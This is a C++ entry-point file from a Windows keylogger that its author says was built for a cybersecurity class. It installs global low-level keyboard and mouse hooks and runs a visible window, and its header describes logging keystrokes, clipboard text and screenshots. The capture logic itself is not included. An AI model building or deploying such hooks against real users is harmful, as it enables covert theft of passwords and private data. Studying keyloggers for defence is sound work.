/**************************************************************************************************
 * Author: Jonathan Roop.                                                                         *
 *                                                                                                *
 * A simple keylogger program I created for a cybersecurity class to better understand the scope  *
 * of keylogging malware threats and capabilities available to keyloggers. Keystrokes, mouse      *
 * events, and clipboard text data are all logged to a file. A screenshot is saved to a .bmp file *
 * whenever the user clicks the mouse's left or right buttons. Low-level keyboard and mouse hooks *
 * ensure that keyboard and mouse events are intercepted even if this program does not have       *
 * focus. The program also registers itself as a ClipboardFormatListener to examine the clipboard *
 * whenever its contents change.                                                                  *
 *                                                                                                *
 * This file is just the entry point into the application. It instantiates the main window and    *
 * starts up the message loop. Most of the work is actually done in the MainWindow class.         *
 *                                                                                                *
 * Various code examples from msdn (Microsoft Development Network) were the primary references I  *
 * used while working on this program. Other sources are credited in comments within my code.     *
 **************************************************************************************************/

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include "MainWindow.h"
#include <Windows.h>

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	//Install the low-level keyboard and mouse hooks:
	HHOOK hhkLowLevelKybd = 
		SetWindowsHookEx(WH_KEYBOARD_LL, MainWindow::LowLevelKeyboardProc, hInstance, 0);
	HHOOK hhkLowLevelMse = 
		SetWindowsHookEx(WH_MOUSE_LL, MainWindow::LowLevelMouseProc, hInstance, 0);

	//Create and show the window
	MainWindow win;
	if (win.Create(L"Simple Keylogger", WS_OVERLAPPEDWINDOW, 345,150))
	{
		ShowWindow(win.Window(), nCmdShow);

		//Initialize COM (Windows Component Object Model)
		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
		if (SUCCEEDED(hr))
		{
			//Run message loop
			MSG msg = {};
			BOOL messageReturnValue;
			while ((messageReturnValue = GetMessage(&msg, NULL, 0, 0)) !=0)
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}

			//Uninitialize COM
			CoUninitialize();
		}
	}

	//Release the low-level keyboard and mouse hooks:
	UnhookWindowsHookEx(hhkLowLevelKybd);
	UnhookWindowsHookEx(hhkLowLevelMse);

	return 0;
}

